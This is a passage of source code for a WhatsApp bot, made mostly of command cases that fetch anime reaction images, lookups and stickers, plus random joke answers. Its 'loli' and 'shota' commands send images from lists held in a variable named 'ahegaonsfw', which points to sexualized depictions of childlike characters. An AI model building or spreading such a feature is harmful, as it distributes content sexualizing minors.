            await XeonBotInc.sendMessage(m.chat, button12ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break   
case 'animenom' :
m.reply(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/sfw/nom`)
 let xxhnekobot = [
    {buttonId: `.nom`, buttonText: {displayText: `Next âš¡`}, type: 1},
    ]
  let xx1button3Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here you go!`,
  buttons: xxhnekobot,
  headerType: 1
  }      
            await XeonBotInc.sendMessage(m.chat, xx1button3Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewaifu':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let button112ssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, button112ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeneko':
m.reply(mess.wait)						
   waifud = await axios.get('https://waifu.pics/api/sfw/neko')
                var wbutsss = [
        {buttonId: `animeneko`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonssMessage = {
       image: {url:waifud.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbutsss,
      headerType: 4
      }
            await XeonBotInc.sendMessage(m.chat,buttonssMessage, { quoted:m }).catch(err => {
                    return('Error!')
                })               
                break
case 'animecuddle':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonsosMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonsosMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break   
case 'animeslap':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let btutttonssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, btutttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animepat':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let xxbuttonssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, xxbuttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeneko':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/neko`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonsTsMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonsTsMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehug':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonussMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonussMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animekiss':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let bxxuttonssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, bxxuttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewlp':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttoxnssMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttoxnssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animespank':
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)
                           var wbuttsss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonssxMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttsss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonssxMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animecry':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/cry`)
                           var wbutt1sss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let button1ssxMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbutt1sss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, button1ssxMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animekill':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/kill`)
                           var wbuttszzss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsxMessages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszzss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsxMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animelick':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/lick`)
                           var wbuttszz12ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx12Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz12ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx12Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animebite':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/bite`)
                           var wbuttszz123ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx123Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz123ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx123Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeyeet':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/yeet`)
                           var wbuttszz124ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx124Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz124ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx124Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animebully':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/lick`)
                           var wbuttszz125ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx125Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz125ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx125Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animebonk':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/bonk`)
                           var wbuttszz126ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx126Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz126ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx126Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewink':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/wink`)
                           var wbuttszz127ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx127Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz127ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx127Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animepoke':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/poke`)
                           var wbuttszz128ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx128Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz128ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx128Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animesmile':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/smile`)
                           var wbuttszz129ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx129Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz129ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx129Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewave':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/wave`)
                           var wbuttszz1210ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx1210Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1210ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx1210Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeawoo':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/awoo`)
                           var wbuttszz1211ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx1211Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1211ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx1211Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeblush':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/blush`)
                           var wbuttszz1212ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx1212Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1212ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx1212Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animesmug':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/smug`)
                           var wbuttszz1213ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx1213Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1213ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx1213Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeglomp':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/glomp`)
                           var wbuttszz1214ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx1214Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1214ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx1214Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehappy':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/happy`)
                           var wbuttszz1215ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx1215Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1215ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx1215Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animedance':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/dance`)
                           var wbuttszz1216ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx1216Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1216ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx1216Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animecringe':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/cringe`)
                           var wbuttszz1217ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx1217Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1217ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx1217Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehighfive':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/highfive`)
                           var wbuttszz1218ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx1218Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1218ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx1218Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehandhold':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/handhold`)
                           var wbuttszz1219ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx1219Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1219ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx1219Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animemegumin':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/megumin`)
                           var wbuttszz1220ss = [
        {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
        ]
      let buttonszzsx1220Messages = {
       image: {url:waifudd.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
      buttons: wbuttszz1220ss,
      headerType: 4
      }     
            await XeonBotInc.sendMessage(m.chat, buttonszzsx1220Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'shinobu2':  
m.reply(mess.wait)						
                    ud = await axios.get('https://waifu.pics/api/sfw/shinobu')
var wbutsss = [
    {buttonId: `.shinobu`, buttonText: {displayText: `Next âœ¨`}, type: 1},
         ]
      let buttonsesMessage = {
      image: {url:ud.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
          buttons: wbutsss,
     headerType: 4
                      }
await XeonBotInc.sendMessage(m.chat,buttonsesMessage, { quoted:m }).catch(err => {
     return('Error!')
    })               
break
case 'animemegumin':
m.reply(mess.wait)						
                    ud = await axios.get('https://waifu.pics/api/sfw/megumin')
var wbutsss = [
    {buttonId: `.megumin`, buttonText: {displayText: `Next âœ¨`}, type: 1},
         ]
      let buttonzMessage = {
      image: {url:ud.data.url},
       caption:  `Here you go!`,
      footer: `${global.botname}`,
          buttons: wbutsss,
     headerType: 4
                      }
await XeonBotInc.sendMessage(m.chat,buttonzMessage, { quoted:m }).catch(err => {
     return('Error!')
    })               
break     
case 'animeawoo':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)
 var wbuttsss = [
    {buttonId: `.${command}`, buttonText: {displayText: `Next âœ¨`}, type: 1},
    ]
  let button1Messages = {
   image: {url:waifudd.data.url},
   caption:  `Here you go!`,
   footer: `${global.botname}`,
  buttons: wbuttsss,
  headerType: 2
  }       
            await XeonBotInc.sendMessage(m.chat, button1Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'loli':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/loli.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'husbu':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/husbu.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'neko2':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/neko.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'randomanime':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/random.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'shota':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/shota.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'waifu2':
if (!m.isGroup) return m.reply(mess.group)
m.reply(mess.wait)
var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXTâž¡ï¸" }, type: 1 }]
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/anime/waifu.json'))
var xeonyresult = pickRandom(ahegaonsfw)
XeonBotInc.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break
case 'genshin':
try {
if (!text) throw `Which genshin are you lookin for?`
const genshin = require("genshin-api")
a = text.toLowerCase();
const anime = await genshin.Characters(text)
let txt = ""
txt += `ðŸŽ€ *Name:* ${anime.name}\n`
txt += `ðŸŽ–ï¸ *Title:* ${anime.title}\n`
txt += `ðŸ’  *Vision:* ${anime.vision}\n`
txt += `ðŸ¹ *Weapon:* ${anime.weapon}\n`
txt += `ðŸ’® *Gender:* ${anime.gender}\n`
txt += `ðŸŒ *Nation:* ${anime.nation}\n`
txt += `ðŸª· *Affiliation:* ${anime.affiliation}\n`
txt += `ðŸŒŸ *Rarity:* ${anime.rarity}\n`
txt += `â„ï¸ *Constellation:* ${anime.constellation}\n`
txt += `ðŸ“– *Description:* ${anime.description}\n`
txt += `ðŸŒ *Url:* https://genshin-impact.fandom.com/wiki/${a}\n`
urll = `https://api.genshin.dev/characters/${a}/portrait`
await XeonBotInc.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
throw mess.error
}
break
case 'anime':
if (!text) throw `Which anime are you lookin for?`
const malScraper = require('mal-scraper')
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) throw `Could not find`
let animetxt = `
ðŸŽ€ *Title: ${anime.title}*
ðŸŽ‹ *Type: ${anime.type}*
ðŸŽ *Premiered on: ${anime.premiered}*
ðŸ’  *Total Episodes: ${anime.episodes}*
ðŸ“ˆ *Status: ${anime.status}*
ðŸ’® *Genres: ${anime.genres}
ðŸ“ *Studio: ${anime.studios}*
ðŸŒŸ *Score: ${anime.score}*
ðŸ’Ž *Rating: ${anime.rating}*
ðŸ… *Rank: ${anime.ranked}*
ðŸ’« *Popularity: ${anime.popularity}*
â™¦ï¸ *Trailer: ${anime.trailer}*
ðŸŒ *URL: ${anime.url}*
â„ *Description:* ${anime.synopsis}*`
                await XeonBotInc.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'ttp': {
           if (!text) return m.reply(`*Example : ${prefix + command} hello*`)
           await XeonBotInc.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/texttopng2?teks=${text}`, 'A L Y A', 'B O T M D', m, {asSticker: true})
         
                     }
                     break
case 'dogesticker':
case 'dogestick':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/love')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await XeonBotInc.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
            case 'can': {
            	if (!text) throw `Ask question\n\nExample : ${prefix + command} i dance?`
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'PATIENT ðŸ‘€' }, type: 1 }]
            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
            case 'is': {
            	if (!text) throw `Ask question\n\nExample : ${prefix + command} she virgin?`
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
            case 'when': {
            	if (!text) throw `Ask question\n\nExample : ${prefix + command} will i get married?`
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'PATIENT ðŸ‘€' }, type: 1 }]
            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
case 'what': {
            	if (!text) throw `Ask question\n\nExample : ${prefix + command} is your name?`
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
case 'where': {
            	if (!text) throw `Ask question\n\nExample : ${prefix + command} is your name?`
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
case 'how': {
            	if (!text) throw `Ask question\n\nExample : ${prefix + command} to date girl?`
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy AhðŸ˜´, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude ðŸ™„`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
case 'rate': {
            	if (!text) throw `Example : ${prefix + command} my profile`
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`
                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
                await XeonBotInc.sendButtonText(m.chat, buttons, lowq, botname, m, {quoted: fkontak})
            	}
            break
case 'handsomecheck':
				if (!text) return m.reply(`Tag Someone, Example : ${prefix + command} @Xeon`)
